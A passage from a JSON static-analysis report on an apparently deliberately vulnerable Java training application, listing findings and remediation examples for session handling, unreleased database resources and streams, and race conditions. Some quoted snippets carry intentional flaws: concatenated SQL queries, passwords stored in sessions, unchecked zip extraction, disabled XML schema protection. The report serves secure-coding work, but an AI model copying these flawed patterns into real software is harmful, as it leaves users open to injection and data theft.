"employeeSearchBean.setEmployeeList(employeeList);\n\t\t\n \t\treturn new ModelAndView(\"searchListEmployee\",\"employeeSearchBean\",employeeSearchBean);\n\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00069", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "210", "snippet": "HttpSession session = request.getSession();\n\t\t    session.setAttribute(\"userRole\", bean.getRoleID());\n\t\t    session.setAttribute(\"userName\", bean.getUserName());\n\t\t    session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00070", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "211", "snippet": "HttpSession session = request.getSession();\n\t\t    session.setAttribute(\"userRole\", bean.getRoleID());\n\t\t    session.setAttribute(\"userName\", bean.getUserName());\n\t\t    session.setAttribute(\"pwd\", request.getParameter(\"pwd\"));"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00071", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "292", "snippet": "mv= new ModelAndView(\"addUser\",\"userAccountBean\",user);\n\n\t\t} else {"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00072", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "328", "snippet": "user.setUserName(userProfile.getUserName());\n\t\t\t\n\t\t\treturn new ModelAndView(\"addUserProfile\",\"userProfile\",user);\n\n\t\t} else {"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00073", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "173", "snippet": "employeeSearchBean.setEmployeeList(employeeList);\n\t\t\n \t\treturn new ModelAndView(\"searchListEmployee\",\"employeeSearchBean\",employeeSearchBean);\n\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00074", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "226", "snippet": "return new ModelAndView(\"success\", \"loginBean\", bean);\n\t\t} else {\n\t\t\tmv.setViewName(\"login\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00075", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "267", "snippet": "mv.setViewName(\"uploadFile\");\n\t\t\t\t\t\tmv.addObject(\"msg\", \"You successfully uploaded file=\" + name);\n\t\t\t\t\t/*} else {\n\t\t\t\t\t\tmv.setViewName(\"uploadFile\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00076", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "733", "snippet": "r.close();\n\t\t\t\tmv.setViewName(\"commandExec\");\n\t\t\t\tmv.addObject(\"dirlist\", dirList);\n\t\t\t} catch (IOException e) {\n\t\t\t\tlogger.error(\"Error in executing command\", e);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00077", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "276", "snippet": "} catch (Exception e) {\n\t\t\t\t\tmv.setViewName(\"uploadFile\");\n\t\t\t\t\tmv.addObject(\"msg\", \"You failed to upload \" + name + \" => \");\n\t\t\t\t\treturn mv;\n\t\t\t\t}"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00079", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "315", "snippet": "mv.setViewName(\"uploadFile\");\n\t\t\t\tmv.addObject(\"msg\",\"You successfully uploaded file=\" + name);\n\t\t    } else {\n\t\t\t\tmv.setViewName(\"uploadFile\");"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00080", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "206", "snippet": "mv.setViewName(\"success\");\n\t\t\tmv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00081", "function": "javax.servlet.http.HttpSession.setAttribute()", "line": "207", "snippet": "mv.addObject(\"msg\", \"Welcome \" + bean.getUserName());\n\t\t\tmv.addObject(\"userObj\", bean);\n\t\t\tsess.setAttribute(\"loginBean\", bean); // Made available across controllers\n\t\t\t\n\t\t\tHttpSession session = request.getSession();"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00082", "function": "org.springframework.web.servlet.ModelAndView.ModelAndView()", "line": "226", "snippet": "return new ModelAndView(\"success\", \"loginBean\", bean);\n\t\t} else {\n\t\t\tmv.setViewName(\"login\");"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00083", "function": "org.springframework.web.servlet.ModelAndView.addObject()", "line": "208", "snippet": "mv.setViewName(\"addEmployee\");\n\t\t\tmv.addObject(\"employeeBean\", emp);\n\t\t}\n\t\treturn mv;"}]}], "remediation": null}, "Unreleased Resource: Database": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00231", "function": "rs = stmt.executeQuery(...)", "line": "105", "snippet": "String sql = \"SELECT SubjectID, Username, Grade,InstructorID,ID from StudentSubjectGrade\";\n\n\t\tResultSet rs = stmt.executeQuery(sql);\n\n\t\twhile (rs.next()) {"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00232", "function": "conn = getConnection(...)", "line": "323", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\n\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t\t\n\t\t\tStatement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00233", "function": "rs = stmt.executeQuery(...)", "line": "74", "snippet": "String sql = \"SELECT SubjectID, Username, Grade,InstructorID,ID from StudentSubjectGrade where Username='\"+userName+\"'\";\n\n\t\t\tResultSet rs = stmt.executeQuery(sql);\n\t\t\t  \t\t \t\n\t\t\twhile (rs.next()) {"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00234", "function": "rs = stmt.executeQuery()", "line": "144", "snippet": "stmt.setString(Integer.parseInt(entry.getKey()), entry.getValue());\n\t\t\t\t}\n\t\t\t\tResultSet rs = stmt.executeQuery();\n\n\t\t\t\tif (rs.next()) {"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00235", "function": "stmt = conn.prepareStatement(...)", "line": "140", "snippet": "//Statement stmt = conn.createStatement();\n\t\t\t\tPreparedStatement stmt = null;\n\t\t\t\tstmt = conn.prepareStatement(sql);\n\t\t\t\tfor(HashMap.Entry<String,String> entry : remediationparamList.entrySet()){\n\t\t\t\t    stmt.setString(Integer.parseInt(entry.getKey()), entry.getValue());"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00236", "function": "stmt = conn.createStatement()", "line": "325", "snippet": "conn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t\t\n\t\t\tStatement stmt = conn.createStatement();\n\t\t\tstmt.executeUpdate(insertSql);"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00237", "function": "conn = getConnection(...)", "line": "69", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\n\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t      \n\t\t     Statement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00238", "function": "conn = getConnection()", "line": "211", "snippet": "if (datasource != null) {\n\t\t\t\tconn = datasource.getConnection();\n\t\t\t\tlogger.debug(\"database catalog name\" + conn.getCatalog());\n\t\t\t\tconn.setCatalog(\"VulnAppDB\");"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00239", "function": "stmt = conn.createStatement()", "line": "71", "snippet": "conn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t      \n\t\t     Statement stmt = conn.createStatement();\n\t\t     String sql = \"SELECT SubjectID, Username, Grade,InstructorID,ID from StudentSubjectGrade where Username='\"+userName+\"'\";"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00240", "function": "stmt = conn.createStatement()", "line": "102", "snippet": "conn = DriverManager.getConnection(dburl, uName, password);\n\n\t\tStatement stmt = conn.createStatement();\n\t\tString sql = \"SELECT SubjectID, Username, Grade,InstructorID,ID from StudentSubjectGrade\";"}]}, {"file": "src/com/accenture/sec/dao/LoginDAO.java", "items": [{"id": "IN00241", "function": "conn = getConnection(...)", "line": "136", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\t\t\n\t\t\t\tconn = DriverManager.getConnection(dbURL,dbuser, dbpwd);\n\t\t\t\t\n\t\t\t\t//Statement stmt = conn.createStatement();"}]}, {"file": "src/com/accenture/sec/dao/StudentDAO.java", "items": [{"id": "IN00242", "function": "conn = getConnection(...)", "line": "100", "snippet": "List<StudentSubjectGradeBean> studGradeList = new ArrayList<StudentSubjectGradeBean>();\n\n\t\tconn = DriverManager.getConnection(dburl, uName, password);\n\n\t\tStatement stmt = conn.createStatement();"}]}], "remediation": {"remediation": {"@id": "R.0024", "@name": "Unreleased Resource: Database", "@dateLastModified": "7/9/2020", "faqs": null, "recommendations": {"recommendation": [{"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Departments()\n        {\n            SqlConnection con;\n            con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n            con.Open();\n\n            SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department&quot;);\n            command.Connection = con;\n                \n            SqlDataReader reader = command.ExecuteReader();\n            List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n            while (reader.Read())\n            {\n                Department department = new Department();\n                department.Id = Convert.ToInt32(reader[&quot;Id&quot;]);\n                department.Name = reader[&quot;Name&quot;].ToString();\n                listDepartments.Add(department);\n            }\n           <em class=\"red\"> con.Close();</em>\n            return View(listDepartments);\n        }", "nonvulncode": "public ActionResult Departments()\n        {\n          <em class=\"blue\">  using (SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString))</em>\n            {\n                con.Open();\n                using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department&quot;, con))\n                {\n                    SqlDataReader reader = command.ExecuteReader();\n                    List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n                    while (reader.Read())\n                    {\n                        Department department = new Department();\n                        department.Id = Convert.ToInt32(reader[&quot;Id&quot;]);\n                        department.Name = reader[&quot;Name&quot;].ToString();\n                        listDepartments.Add(department);\n                    }\n                    return View(listDepartments);\n                }\n            }\n        }", "comments": "With .Net the strategy can be similar to the try-with-resource in Java. By leveraging the &quot;using&quot;, or &quot;finally&quot;, the code will automatically dispose the used stream and objects at the end of the block (even if an exception is generated).", "impact": "No impact on the performance or functionality on applying this change.\nThe change will improve the garbage collector process.", "abstract": "Use &quot;using&quot; will release the resources when the method exits."}, {"@type": ".NET/C#/ASP", "vulncode": "public ActionResult Departments()\n        {\n            SqlConnection con;\n            con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n            con.Open();\n\n            SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department&quot;);\n            command.Connection = con;\n                \n            SqlDataReader reader = command.ExecuteReader();\n            List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n            while (reader.Read())\n            {\n                Department department = new Department();\n                department.Id = Convert.ToInt32(reader[&quot;Id&quot;]);\n                department.Name = reader[&quot;Name&quot;].ToString();\n                listDepartments.Add(department);\n            }\n            con.Close();\n            return View(listDepartments);\n              \n        }", "nonvulncode": "public ActionResult Departments()\n        {\n            SqlConnection con = new SqlConnection(ConfigurationManager.ConnectionStrings[&quot;VulnAppDBConnection&quot;].ConnectionString);\n            List&lt;Department&gt; listDepartments = new List&lt;Department&gt;();\n            try\n            {\n                con.Open();\n                using (SqlCommand command = new SqlCommand(&quot;Select Id, Name From dbo.Department&quot;, con))\n                {\n                    SqlDataReader reader = command.ExecuteReader();\n                    \n                    while (reader.Read())\n                    {\n                        Department department = new Department();\n                        department.Id = Convert.ToInt32(reader[&quot;Id&quot;]);\n                        department.Name = reader[&quot;Name&quot;].ToString();\n                        listDepartments.Add(department);\n                    }\n                }\n            }\n            catch\n            {\n            }<em class=\"blue\">finally\n            {\n                if (con != null)\n                    con.Close();</em>\n            }\n            return View(listDepartments);\n        }", "comments": "With .Net the strategy can be similar to the try-with-resource in Java. By leveraging the &quot;using&quot;, or &quot;finally&quot;, the code will automatically dispose the used stream and objects at the end of the block (even if an exception is generated).", "impact": "No impact on the performance or functionality on applying this change.\nThe change will improve the garbage collector process.", "abstract": "Use &quot;finally&quot; will release the resources when the method exits."}, {"@type": "JAVA/JSP", "vulncode": "public List&lt;UserAccountBean&gt; listUser() {\n\t\t\n\t\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\n\t\t\n\t\tConnection conn = null;\n\t\ttry {\n\t\tInputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;);\n\t\tProperties prop = new Properties();\t\t\n\t\tprop.load(input);\n\t\t\n\t\tString dbURL = prop.getProperty(&quot;sec_db_url&quot;);\n\t\tString dbuser = prop.getProperty(&quot;sec_user&quot;);\n\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\tconn = DriverManager.getConnection(dbURL,dbuser , dbpwd);\t\n\t\tStatement stmt = conn.createStatement();\t\t\n\t\tString sql = &quot;SELECT Username, Password, RoleID from account;\t\t\n\t\tResultSet rs = stmt.executeQuery(sql);\n\t\t\n\t\twhile(rs.next()) {\n\t\t\tUserAccountBean userAccount = new UserAccountBean();\n\t\t\t\n\t\t\tuserAccount.setUserName(rs.getString(&quot;Username&quot;));\n\t\t\tuserAccount.setPwd(rs.getString(&quot;Password&quot;));\n\t\t\tuserAccount.setRoleID(rs.getString(&quot;RoleID&quot;));\n\t\t\t\n\t\t\tlistUsers.add(userAccount);\n\t\t}\n<em class=\"red\">input.close\n\t\tconn.close();</em>\t\t\n\t\t} catch (FileNotFoundException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (SQLException e) {\n\t\t\te.printStackTrace();\n\t\t}\t\t\t\t\n\t\treturn listUsers;\n\t}", "nonvulncode": "public List&lt;UserAccountBean&gt; listUser() throws SQLException {\n\t\t\n\t\tList&lt;UserAccountBean&gt; listUsers = new ArrayList&lt;UserAccountBean&gt;();\n\t\t\n\t\tEntityManager em=entityManagerFactory.createEntityManager();\n\t\tConnection conn = null;\n\t\t\n\t\t<em class=\"blue\">try (InputStream input = LoginDAO.class.getResourceAsStream(&quot;/com/accenture/sec/resources/sec_conn.properties&quot;)) {</em>\n\t\tProperties prop = new Properties();\t\t\n\t\tprop.load(input);\n\t\t\n\t\tString dbURL = prop.getProperty(&quot;sec_db_url&quot;);\n\t\tString dbuser = prop.getProperty(&quot;sec_user&quot;);\n\t\tString dbpwd = prop.getProperty(&quot;sec_password&quot;);\n\t\t\n\t\tconn = DriverManager.getConnection(dbURL,dbuser , dbpwd);\t\t\n\t\tStatement stmt = conn.createStatement();\n\t\tString sql = &quot;SELECT Username, Password, RoleID from account&quot;;\n\t\tResultSet rs = stmt.executeQuery(sql);\n\t\t\n\t\twhile(rs.next()) {\n\t\t\tUserAccountBean userAccount = new UserAccountBean();\n\t\t\t\n\t\t\tuserAccount.setUserName(rs.getString(&quot;Username&quot;));\n\t\t\tuserAccount.setPwd(rs.getString(&quot;Password&quot;));\n\t\t\tuserAccount.setRoleID(rs.getString(&quot;RoleID&quot;));\n\t\t\t\n\t\t\tlistUsers.add(userAccount);\n\t\t}\n\n\t\t} catch (FileNotFoundException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (IOException e) {\n\t\t\te.printStackTrace();\n\t\t} catch (SQLException e) {\n\t\t\te.printStackTrace();\n\t\t} finally {\n\t\t\tif (conn!= null)\n\t\t\t\tconn.c<em class=\"blue\">lose();\n\t\t}</em>\t\t\t\t\n\t\treturn listUsers;\n\t}", "comments": "In case of the vulnerable example of the linear try-catch-finally block, the last exception encountered is the exception that is propagated up the call stack, meaning that any exception inside try will be suppressed.\n\nBy using the try-with-resource strategy, in case a resource throws an exception (e.g., when the application tries to close it), any other resources opened within the same try-with-resources block will still get closed. \nIf an exception is thrown from inside the try-with-resources block, or when a resource is closed (e.g., when close() is called), the exception will be propagated up in the call stack and is not suppressed.", "impact": "No impact on the performance or functionality on applying this change.\nThe change will improve the garbage collector process.", "abstract": "Use of try with resources"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Race Condition: Singleton Member Field": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00243", "function": "AssignmentStatement()", "line": "95", "snippet": "if(grade<=100) {\n\t\t\t\t\tThread.sleep(100);\n\t\t\t\t\tgrade = grade+20;\n\t\t\t\t}\n\t\t\t}"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00244", "function": "AssignmentStatement()", "line": "48", "snippet": "*/\n \n             bmi = calculateBMI(Integer.parseInt(weight), Integer.parseInt(height));\n\t\t\t\tif (bmi > 18 && bmi <25) {\n\t\t\t\t\tpoints = points +5;"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00245", "function": "AssignmentStatement()", "line": "303", "snippet": "*/ catch (Exception e) {\n\t\t\tlogger.error(\"Error during JSON parse\"+e);\n\t\t\tisWrong = true;\n\t\t}\n\t\treturn mv;"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00246", "function": "AssignmentStatement()", "line": "50", "snippet": "bmi = calculateBMI(Integer.parseInt(weight), Integer.parseInt(height));\n\t\t\t\tif (bmi > 18 && bmi <25) {\n\t\t\t\t\tpoints = points +5;\n\t\t\t\t}\n\t\t\t\tif (bmi<19) {"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00247", "function": "AssignmentStatement()", "line": "92", "snippet": "\"msg\",\"Not authorized to view other students detail\"); }*/\n\t\t\tfor (StudentSubjectGradeBean studDtl: listStudents) {\n\t\t\t\tgrade=studDtl.getGrade();\n\t\t\t\tif(grade<=100) {\n\t\t\t\t\tThread.sleep(100);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00248", "function": "AssignmentStatement()", "line": "433", "snippet": "String dbpwd = prop.getProperty(\"sec_password\");\n\t\t\tString filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";\n\t\t\tthis.fileName = request.getParameter(\"name\")!=null? request.getParameter(\"name\") : filePath + \"sec_conn_encrypted.properties\";\n\t\t\t\n\t\t\tString encryptedText = encryptWithSHA(dbpwd);"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00249", "function": "AssignmentStatement()", "line": "364", "snippet": "if(!isWrong)\n\t\t\tlogger.error(\"Error during JSON parse\"+e);\n\t\t\tisWrong = true;\n\t\t} catch (IOException e) {\n\t\t\tlogger.error(\"Error during JSON parse\"+e);"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00250", "function": "AssignmentStatement()", "line": "358", "snippet": "try {\n\t        String filePath = System.getProperty(\"catalina.home\") + \"\\\\tmpFiles\\\\\";\n\t        this.fileName = filePath + name;\n\t        File fileToDownload = new File(fileName);\n\t        //JarFile jf = new JarFile(fileToDownload); //Improper Verification of Cryptographic Signature"}]}, {"file": "src/com/accenture/sec/controller/StudentController.java", "items": [{"id": "IN00251", "function": "AssignmentStatement()", "line": "100", "snippet": "if(grade<=100) {\n\t\t\t\tThread.sleep(100);\n\t\t\t\tgrade= grade+50;\n\t\t\t}"}]}, {"file": "src/com/accenture/sec/controller/FormServlet.java", "items": [{"id": "IN00252", "function": "AssignmentStatement()", "line": "53", "snippet": "}\n\t\t\t\tif (bmi<19) {\n\t\t\t\t\tpoints = points +1;\n\t\t\t\t}"}]}, {"file": "src/com/accenture/sec/controller/LoginController.java", "items": [{"id": "IN00253", "function": "AssignmentStatement()", "line": "367", "snippet": "} catch (IOException e) {\n\t\t\tlogger.error(\"Error during JSON parse\"+e);\n\t\t\tisWrong = true;\n\t\t}\n\t\t return addUserProfile(userProfile);"}]}], "remediation": {"remediation": {"@id": "R.0168", "@name": "Race Condition: Singleton Member Field", "@dateLastModified": "2/22/2021", "faqs": {"faq": {"question": "But race condition cannot be exploited or used to get access to the application\u2026 Is this a code quality issue?", "answer": "Security objectives are to protect Conidentiality, Integrity and Availability (CIA). Race conditions can cause the values inside an application to be not correct, breaking the security principle of &quot;Integrity&quot;."}}, "recommendations": {"recommendation": [{"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">FormServlet.java</em>\npublic class FormServlet extends HttpServlet{\n\u2026.\n<em class=\"red\">Integer bmi = 0;\nInteger points;\n</em>\n@Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n    \t\tthrows ServletException, IOException {\n \n        String height = request.getParameter(&quot;height&quot;);\n        String weight = request.getParameter(&quot;weight&quot;);\n  \n           <em class=\"red\">  bmi = calculateBMI(Integer.parseInt(weight), Integer.parseInt(height));\n\t\t\t\tif (bmi &gt; 18 &&</em> bmi &lt;25) {\n\t\t\t\t\t<em class=\"red\">points = points +5;</em>\n\t\t\t\t}\n\t\t\t\tif (bmi&lt;19) {\n\t\t\t\t\tpoints = points +1;\n\t\t\t\t}\n            \n            request.setAttribute(&quot;bmi&quot;, bmi);\n     \n            response.setHeader(&quot;BMI&quot;, String.valueOf(bmi));\n \n            RequestDispatcher dispatcher \n              = request.getRequestDispatcher(&quot;calculateStudentBMI.jsp&quot;);\n            dispatcher.forward(request, response);\n            response.sendRedirect(&quot;calculateStudentBMI.jsp&quot;);\n        \n    }", "nonvulncode": "<em class=\"bold\">FormServlet.java</em>\npublic class FormServlet extends HttpServlet{\n\u2026.\nInteger bmi = 0;\nInteger points;\n\n@Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n    \t\tthrows ServletException, IOException {\n \n        String height = request.getParameter(&quot;height&quot;);\n        String weight = request.getParameter(&quot;weight&quot;);\n  \n<em class=\"blue\">synchronized (bmi) {</em>\n           <em class=\"red\"> </em> bmi = calculateBMI(Integer.parseInt(weight), Integer.parseInt(height));\n\t\t\t\tif (bmi &gt; 18 && bmi &lt;25) {\n\t\t\t\t\tpoints = points +5;\n\t\t\t\t}\n\t\t\t\tif (bmi&lt;19) {\n\t\t\t\t\tpoints = points +1;\n\t\t\t\t}\n<em class=\"blue\">}</em>\n            \n            request.setAttribute(&quot;bmi&quot;, bmi);\n        \n            response.setHeader(&quot;BMI&quot;, String.valueOf(bmi));\n \n            RequestDispatcher dispatcher \n              = request.getRequestDispatcher(&quot;calculateStudentBMI.jsp&quot;);\n            dispatcher.forward(request, response);\n            response.sendRedirect(&quot;calculateStudentBMI.jsp&quot;);\n        \n    }", "comments": "Race condition with Thread is detected when there is possibility for two instances to access the Servlet at approximately the same time. The two request handler threads will interleave and the result may be calculated using the wrong instance values creating a race condition. \nTo avoid race conditions, code blocks can be synchronized, which will prevent data consistency issue. \n\nTo avoid the issue, consider below points\n\n1. Use read-write locks instead of full locks where only a part of the threads need to write, so the lock can be applied only to particular block.\n2. Find ways to restructure code in order to reduce the size of critical sections. Like avoid using class level variables, initialize the variable as class level variable only if it is absolutely necessary, otherwise use local object/variable.", "impact": "When method/block is synchronized, threads have to wait until the first thread releases the lock which will impact performance. It is recommended to use Synchronized at block level, instead of method level so the whole method is not blocked from execution.", "abstract": "Use of synchronized block"}, {"@type": "JAVA/JSP", "vulncode": "<em class=\"bold\">FormServlet.java</em>\npublic class FormServlet extends HttpServlet{\n\u2026.\n<em class=\"red\">Integer bmi = 0;\nInteger points;\n</em>\n@Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n    \t\tthrows ServletException, IOException {\n \n        String height = request.getParameter(&quot;height&quot;);\n        String weight = request.getParameter(&quot;weight&quot;);\n  \n           <em class=\"red\">  bmi = calculateBMI(Integer.parseInt(weight), Integer.parseInt(height));\n\t\t\t\tif (bmi &gt; 18 &&</em> bmi &lt;25) {\n\t\t\t\t\t<em class=\"red\">points = points +5;</em>\n\t\t\t\t}\n\t\t\t\tif (bmi&lt;19) {\n\t\t\t\t\tpoints = points +1;\n\t\t\t\t}\n            \n            request.setAttribute(&quot;bmi&quot;, bmi);\n    \n            response.setHeader(&quot;BMI&quot;, String.valueOf(bmi));\n \n            RequestDispatcher dispatcher \n              = request.getRequestDispatcher(&quot;calculateStudentBMI.jsp&quot;);\n            dispatcher.forward(request, response);\n            response.sendRedirect(&quot;calculateStudentBMI.jsp&quot;);\n        \n    }", "nonvulncode": "<em class=\"bold\">FormServlet.java</em>\npublic class FormServlet extends HttpServlet{\n\u2026.\n<em class=\"blue\">AtomicInteger bmi = new AtomicInteger(0);\nAtomicInteger points = new AtomicInteger(0);</em>\n@Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response)\n    \t\tthrows ServletException, IOException {\n \n        String height = request.getParameter(&quot;height&quot;);\n        String weight = request.getParameter(&quot;weight&quot;);\n  \n\t\t\t\tbmi.set(calculateBMI(Integer.parseInt(weight), Integer.parseInt(height)));\n\t\t\t\tif (bmi.get() &gt; 18 && bmi.get() &lt;25) {\n\t\t\t\t\tpoints.set(<em class=\"blue\">points.addAndGet(5)</em>); //add the given number and gets the value\n\t\t\t\t}\n\t\t\t\tif (bmi.get()&lt;19) {\n\t\t\t\t\tpoints.set(<em class=\"blue\">points.incrementAndGet()</em>); //Automatically increments by 1\n\t\t\t\t}\n            \n            request.setAttribute(&quot;bmi&quot;, bmi);\n          \n            response.setHeader(&quot;BMI&quot;, String.valueOf(bmi));\n \n            RequestDispatcher dispatcher \n              = request.getRequestDispatcher(&quot;calculateStudentBMI.jsp&quot;);\n            dispatcher.forward(request, response);\n            response.sendRedirect(&quot;calculateStudentBMI.jsp&quot;);\n        \n    }", "comments": "Race condition with Thread is detected when there is possibility for two instances to access the Servlet at approximately the same time. The two request handler threads will interleave and the result may be calculated using the wrong instance values creating a race condition. \n\nTo avoid race conditions, code blocks can be synchronized, which will prevent data consistency issue, or the AtomicInteger variable. \n\nBy having the class level variable as AtomicInteger, thread-safety is built into the actual object itself. It has various methods which ensures data consistency. <em class=\"bold\">AtomicReference</em> can be used for String or any object. Like, AtomicReference&lt;String&gt; atomicStringReference =\n    new AtomicReference&lt;String&gt;();\nAtomicReference&lt;Class A&gt; atomicStringReference =\n    new AtomicReference&lt;Class A&gt;();\n\nImport statement to be added : import java.util.concurrent.atomic.AtomicInteger;\n\nReference: https://www.baeldung.com/java-thread-safety\n\nNote: Using volatile only changes the way the compiler will perform memory allocations and does NOT solve race conditions. For more information, see comments on: https://stackoverflow.com/questions/29839572/using-volatile-to-avoid-race-conditions", "impact": "No impact", "abstract": "Use of AtomicInteger"}]}, "mitigations": {"mitigation": {"system": "N/A", "configuration": "N/A", "backend": "N/A", "frontend": "N/A", "comments": "Extra layers (e.g. NGFW, WAF, OS hardening, mod_rewrite, configurations, etc.) are not able to protect against this type of vulnerability due to the nature of the vulnerability itseft, or if added an extra layer it will have a huge impact on the system performance."}}}}}, "Unreleased Resource: Streams": {"language": "JAVA", "files": [{"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00264", "function": "new FileWriter(...)", "line": "1047", "snippet": "XMLEventWriter writer =\n\t\t            factory.createXMLEventWriter(\n\t\t                    new FileWriter(filePath));\n\t\t    String data =\"<EmployeeInfo><empName>Jhanvi</empName></EmployeeInfo>\";"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00265", "function": "bos = new BufferedOutputStream(new java.io.FileOutputStream())", "line": "331", "snippet": "private void extractFile(ZipInputStream zipIn, String filePath) throws IOException {\n        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(filePath));\n        byte[] bytesIn = new byte[BUFFER_SIZE];\n        int read = 0;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00266", "function": "httpResponse.getEntity().getContent()", "line": "1164", "snippet": "BufferedReader reader = new BufferedReader(new InputStreamReader(\n\t\t\t\thttpResponse.getEntity().getContent()));\n\n\t\tString inputLine;"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00267", "function": "reader = new BufferedReader(new java.io.InputStreamReader())", "line": "1163", "snippet": "+ httpResponse.getStatusLine().getStatusCode());\n\n\t\tBufferedReader reader = new BufferedReader(new InputStreamReader(\n\t\t\t\thttpResponse.getEntity().getContent()));"}]}, {"file": "src/com/accenture/sec/controller/EmployeeController.java", "items": [{"id": "IN00268", "function": "getInputStream()", "line": "613", "snippet": "* validator.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\");\n\t\t\t\t */\n\t\t\t  validator.validate(new StreamSource(file.getInputStream()));"}]}, {"file": 